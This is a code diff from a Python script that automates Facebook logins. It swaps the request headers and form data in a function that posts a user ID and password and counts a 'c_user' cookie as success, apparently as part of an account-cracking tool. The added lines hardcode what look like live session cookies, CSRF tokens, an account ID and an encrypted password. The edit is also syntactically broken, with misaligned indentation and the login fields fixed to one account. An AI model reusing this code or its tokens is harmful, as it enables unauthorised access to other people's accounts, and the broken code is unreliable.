@@ -1283,29 +1283,56 @@ def mbasic(uid,pwx,tl):
             head = {"accept": "*/*", "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; KirinX Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9, en-US,en;q=0.8", "x-requested-with": "XMLHttpCanary", "priority": "u=1, i"} 
             free_fb = Session.get('https://touch.facebook.com').text
             headers = {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.facebook.com',
-            'Referer': 'https://www.facebook.com/?stype=lo&flo=1&deoia=1&jlou=Afi33CVi9aSFnvUb391F5-qlmBdkDydfWor_r096lWwevRPeU25CXbhD3Lu2vAKsAmolO1g11BrRAPV91IVkN8RM2lH1tSLE5rEyJ4LRALngow&smuh=25331&lh=Ac_MV4aD9PHN0himQIs',
-            'Upgrade-Insecure-Requests': '1',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-            'dpr': '1',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.108", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.108"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'viewport-width': '862',}
+    "User-Agent": "Mozilla/5.0 (Linux; Android 13; V2060 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.21 Mobile Safari/537.36",
+    "Accept-Encoding": "gzip, deflate, br, zstd",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "sec-ch-ua-platform": '"Android"',
+    "sec-ch-ua": '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
+    "x-response-format": "JSONStream",
+    "sec-ch-ua-mobile": "?1",
+    "x-asbd-id": "359341",
+    "x-fb-lsd": "AdGm0XNgPZI",
+    "x-requested-with": "XMLHttpRequest",
+    "origin": "https://limited.facebook.com",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-dest": "empty",
+    "referer": "https://limited.facebook.com/",
+    "accept-language": "en-US,en;q=0.9",
+    "priority": "u=1, i",
+    "Cookie": "datr=j2D0aGNfrkhe6gsD30X9rocd; sb=j2D0aAXaXOHjOD9-oe2tBQq3; m_pixel_ratio=2.4749999046325684; wd=437x973; fr=0Cgs75RqCn7Ic4eLB..Bo9GCP..AAA.0.0.Bo9NIG.AWevxQpVa2RjMHVgm1WI0GmCmdY"
+}
+
             data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'login_source': 'comet_headerless_login',
-            'next': '',
-            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2MDg1NjEzNy44MzcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NjA4NTYxMzcuODM4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3NjA4NTYxMzcuODM5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjA4NTYxMzcuODQzLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOlsiZW4tSU4iLCJlbi1VUyIsImVuLUdCIiwiZW4iLCJoaSIsImd1IiwiYm4iXX1dLCIzMDAwNCI6W3sidCI6MTc2MDg1NjEzNy44NDQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6MTAwfV0sIjMwMDA1IjpbeyJ0IjoxNzYwODU2MTM3Ljg0NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijp7InciOjE0NDAsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3NjA4NTYxMzcuODQ0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiJkZWZhdWx0In1dLCIzMDAwOCI6W3sidCI6MTc2MDg1NjEzNy44NzcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6InByb21wdCJ9XSwiMzAwMTIiOlt7InQiOjE3NjA4NTYxMzcuODQ1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiJHb29nbGUgSW5jLiJ9XSwiMzAwMTMiOlt7InQiOjE3NjA4NTYxMzcuODQ1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc2MDg1NjEzNy44NDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6IldpbjMyIn1dLCIzMDAxOCI6W3sidCI6MTc2MDg1NjEzNy44NDYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTc2MDg1NjEzNy44NTUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6dHJ1ZX1dLCIzMDA0MCI6W3sidCI6MTc2MDg1NjEzNy44NTUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6LTMzMH1dLCIzMDA5MyI6W3sidCI6MTc2MDg1NjEzNy44NTUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6MH1dLCIzMDA5NCI6W3sidCI6MTc2MDg1NjEzNy44NTUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDEuMC4wLjAgU2FmYXJpLzUzNy4zNiJ9XSwiMzAwOTUiOlt7InQiOjE3NjA4NTYxMzcuODU1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjEwfV0sIjMwMTA2IjpbeyJ0IjoxNzYwODU2MTM3Ljc5MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzYwODU2MTM3Ljg4NywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzYwODU2MTM3Ljc5MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjpmYWxzZX1dfQ==',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            url = "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzYwODY5NjExLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next"
+    "m_ts": "1760874943",
+    "li": "v9H0aI7R_BQkzL03WnfHN8aI",
+    "try_number": "0",
+    "unrecognized_tries": "0",
+    "email": "100058660152667",
+    "prefill_contact_point": "100058660152667|964119|",
+    "prefill_source": "browser_dropdown",
+    "prefill_type": "password",
+    "first_prefill_source": "browser_dropdown",
+    "first_prefill_type": "contact_point",
+    "had_cp_prefilled": "true",
+    "had_password_prefilled": "true",
+    "is_smart_lock": "false",
+    "bi_xrwh": "92004344361786634",
+    "encpass": "#PWD_BROWSER:5:1760875018:AYFQAEU6J/oHurmTPKUMYpcEutIj32eX4NsMcUtALmTB6t5NdBjqShcJx38tk531kbV8ZapQMO+RKvV5BcFJ7iTbaDo0+oUJfLMR87wvmXDZ539KQg1b7bchMxanDdfIL5U21rXEt2Awqg==",
+    "fb_dtsg": "NAfsTy_nVmMY-aPq2jodNfEfMAoYxODjAWsWDzfAH8A75HyboS_sRKg:0:0",
+    "jazoest": "25078",
+    "lsd": "AdGm0XNgPZI",
+    "_dyn": "1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhw23E52q1ewb60Y82Cwro0wa4o1MUaE36wdq0ny0oi0zE1jU1soG0hi0Lo6-0Co178dE1UU3jwea",
+    "csr": "",
+    "hsdp": "",
+    "hblp": "",
+    "sjsp": "",
+    "req": "7",
+    "fmt": "1",
+    "a": "AYyQqdylf2eoq8yXWSG7K_Msk0NY97pal6sBjs63bUJC904PTS5BYy4tJzgHZU9E7RpVfhWJ4bHrnLAwXzSmITIqS3nGPb_LZ0Y",
+    "_user": "0"
+}
+            url = "https://limited.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             response = Session.post(url, data=data, headers=headers, allow_redirects=True, timeout=30)
             cok = Session.cookies.get_dict()
             if "c_user" in cok:
